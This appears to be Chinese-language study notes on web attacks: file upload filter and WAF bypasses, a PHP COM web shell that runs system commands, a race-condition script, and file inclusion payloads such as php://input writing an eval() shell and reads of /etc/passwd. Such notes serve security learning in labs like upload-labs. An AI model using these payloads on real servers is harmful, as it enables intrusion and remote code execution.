---
title: File Upload
description: 文件上传
---

# 文件上传

## 黑白名单

黑名单：黑名单是一个列表，在黑名单列表里面记录的内容（人、手机号、ip等）或被限制或禁止执行一些操作。

白名单：白名单与黑名单相对，也是一个列表，只有在白名单列表里的内容（人、手机号、ip等）才可以执行一些操作，不在白名单记录的内容（人、手机号、ip等）则会被禁止执行操作。

文件上传漏洞黑名单：

某些网站禁止用户上传扩展名为 .asp .php .aspx .jsp 的文件， .asp .php .aspx .jsp 这个列表就叫做黑名单。

文件上传漏洞白名单：

某些网站只允许用户上传扩展名为 .png .jpg .gif 的文件， .png .jpg .gif 这个列表就叫做白名单。

## MIME绕过

MIME：（Multipurpose Internet Mail Extensions），MIME是一种标准，用来表示文档、文件或字节流的性质和格式。

![]](./_img/1.png)

**服务器在检测上传的图片时，可能会检测文件的MIME类型。**

**此类检测可以通过修改MIME进行绕过**

## 特殊扩展名绕过

**由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。**

##  hataccess绕过

.htaccess文件 (或者“分布式配置文件”）,全称是 Hypertext Access(超文本口)。提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache的AllowOverride指令来设置。

**.htaccess在文件上传中最大作用就是 可以使任何类型文件作为 php解析，该文件在 Apache里默认是启用的。**

> #任何格式都用php解释
>
> SetHandler application/x-httpd-php 

## 大小写绕过

**网站在过滤扩展名时，如果没有将字符串统一大小写后再进行比较的话，可以通过修改扩展名大小写的方式绕过。**

## 空格绕过

在Windows中，文件首位如果有空格，系统会默认去除。如："example.php    " 文件会被修改成："example.php"

**但是在WAF字符串匹配时，".php    " 与 ".php"匹配不成功，即可绕过**



## 点号绕过

**在windows中，文件名最末尾的 点不会被解析**



## 点+空格+点绕过

**PHP中的 deldot()函数会删除字符串中的点，但是该函数检测到末尾的第一个点之后，会删除，并且继续检测。如果遇到空格则会停止删除。**

构造 点 空格 点 即可进行绕过

## 特殊字符::$DATA绕过

**在 window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名他的目的就是不检查后缀名。**

如：a.php::$DATA 与 a.php 等价



## 双写绕过

**PHP中 str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符（不区分大小写）且只能去除一次。**

如果后端服务器在验证扩展名时，没有递归替换扩展名的话，可以使用双写扩展名的方式进行绕过。



## 00截断-GET

**php的一些函数的底层是 C语言，C语言的字符串中，如果遇到0x00会被编译器认为是字符串结束标志，会把该字符串截断。0x表示 16进制，URL中%00解码成 16进制就是 0x00。**

可以构造名字带有%00木马上传，进行绕过。

**php 版本 <5.3.4 才可以进行00截断**

**magic_quotes_gpc = Off**

## 00截断-POST

**同理**



# WAF及disable_function绕过

## WAF绕过思路

* **增加WAF负担**

如果WAF接收的数据包长度过长，可能会把部分数据包或者是数据包的部分内容进行无检测“放行”

如果站点的流量过大，为了保证网站的可用性，WAF可能会放弃对部分数据包的检测

* **构造异常数据包**

WAF在进行检测拦截的时候，一般比较死板。类似双写绕过、大小写绕过等方式都是基于此思路绕过



## 常见绕过方法

根据以上的绕过思路，并针对文件上传漏洞，可以派生出以下几种绕过方法（适用于upload-labs）

* 垃圾数据绕过

* 特殊符号绕过

  推测安全狗在进行匹配的时候，使用的是单引号或者是双引号进行匹配，取一个闭合引号中间的内容

* 截断绕过

* 重复数据绕过



## disable_function绕过

**PHP的危险函数比较多，稍微不注意就有可能导致漏洞产生。而且如果网站中被上传了webshell的话，webshell中也会调用类似system的函数来执行系统命令。**

**disable_function可以用于限制，网站中的某些函数，在disable_function列表中的函数会被禁止执行。即使网站中存在webshell，也会导致webshell不能发挥其功能。**

**disable_function**

**在对应php版本中的 php.ini文件中设置**



## disable_function绕过

**com组件绕过**

在windows中，PHP开发一般会启动一个扩展组件：php_com_dotnet

```php
绕过代码：
<?php
$command = $_GET['a'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$studio = $exec->StdOut();
$out = $StdOut->ReadAll();
echo $out;
?>
  访问 http://127.0.0.1/a.php?a=calc ，此时电脑上面会弹出一个计算器
```

## 蚁剑自动绕过

**disable——function 插件**

# 文件解析漏洞利用

## 图片马的制作与利用

图片马就是在图片中隐藏一句话木马，使用正常的图片上传功能将该图片马上传至服务器后，再利用**htaccess**、**文件包含漏洞**或者**解析漏洞**即可发挥作用。

**注：单纯的上传图片马并不会发挥作用，必须配合其他漏洞。**

## 条件竞争绕过

条件竞争是代码逻辑存在问题，代码执行逻辑为：服务器先将上传的文件保存在临时目录中，然后再对后缀名进行白名单验证。如果符合白名单的要求，并重命名，但如果不符合白名单的要求，就会被删除掉。

**代码删除文件是需要耗费时间的，如果我们能够在文件被删除之前就访问到了此文件，那么即使删除了也无所谓。这个过程就叫做条件竞争。**

```python
import requests 
url = "http://ip:端口/upload/shell.php" 
while 1: 
  requests.get(url)
```

## Apache HTTPD解析漏洞

Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。

在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。

如：a.php.jpg 文件会被当成 php文件执行

利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。



## Nginx 解析漏洞





# 文件包含漏洞

**文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。**

```php
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
  $_GET['filename']
  参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改的值，执行非预期的操作。

```



#### 包含脚本

**Php**

```php
include('xx.php');// 使用该函数包含文件
include_one('xxx.php');//功能与include相同，当时当程序重复调用同一个文件时，只会调用一次
require('xxx.php');// require 和 include()类似，但是require()调用的文件发生错误时，程序会输出错误信息，并终止脚本执行
require_one('xxx.php');// require()相同，但是当程序重复调用同一个文件时，只会调用一次。

```

**asp**

```asp
<!--#include file="xxx.asp"-->
```

**Aspx**

```asp
<!--#include file="xxx.aspx"-->
```

**Jsp**

```jsp
<%@ include file="xxx.jsp"%>
<jsp:include page="xxx.jsp"/>
```

#### 漏洞类型

**本地文件包含**

本地包含文件需要指定目标服务器本地的一个文件。

**无限制直接包含**

http://127.0.0.1?filename=xxx.txt

**包含计算机上的其他文件**

http://127.0.0.1?filename=../../../xxx.txt

**限制扩展名的包含**

```php
<?php  
    $filename = $_GET['file'];
    include($filename . ".html");
?>
```

00截断

条件：php<5.3.4  magic_quotes_gpc = Off

http://127.0.0.1/?filename=xxx.txt%00

**远程文件包含**

代码会进行限制：allow_url_include = On

远程文件包含需要指定一个远程文件的地址，这个地址我们可以自己构造。

**file=网址**

（phpstudy可以构建远程地址）

**有后缀限制**

原理：

http://127.0.0.1/xxx.txt?.html

http://127.0.0.1/xxx.txt#.html

加了问号或者#号（%23编码就是#号），再访问链接显示的还是原来的页面

#### 协议流绕过

**php协议**

**`php://filter`**

**php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。**

读取文件：

> php://filter/read=convert.base64-encode/resource=index.php
>
> 读取上级目录文件：
>
> php://filter/read=convert.base64-encode/resource=../../../a.txt
>
> 读取其他的文件
>
> php://filter/read=convert.base64-encode/resource=F:\b.txt
>
> 需要base64解码



`php://input`

**将post请求中的数据作为PHP代码执行，回显出现在header中**

> http://127.0.0.1/?file=php://input
>
> 发送post请求，请求内容为要执行的PHP代码
>
> <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1]); phpinfo(); ?>'); ?>



**file协议**

**访问本地文件系统，所有语言都支持，file协议需要传入绝对路径（完整路径）。**

> 注意读取linux文件是：
>
> file:///etc/passwd

**data协议**

读取数据流

* allow_url_fopen ：on

* allow_url_include：on

> data://text/plaindata://text/plain,<?php%20phpinfo()?>
>
> 以base64的形式，执行
>
> <?php phpinfo()?>  base64编码=>  PD9waHAgcGhwaW5mbygpPz4=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
